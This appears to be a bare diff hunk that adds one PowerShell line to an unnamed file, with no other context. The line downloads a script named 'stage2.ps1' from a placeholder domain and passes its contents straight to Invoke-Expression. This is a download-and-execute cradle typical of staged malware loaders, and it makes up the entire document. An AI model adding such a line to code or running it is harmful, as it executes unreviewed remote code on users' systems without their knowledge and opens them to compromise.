@@ -1,0 +1,1 @@
+Invoke-Expression (Invoke-WebRequest -Uri 'https://example.com/stage2.ps1' -UseBasicParsing).Content
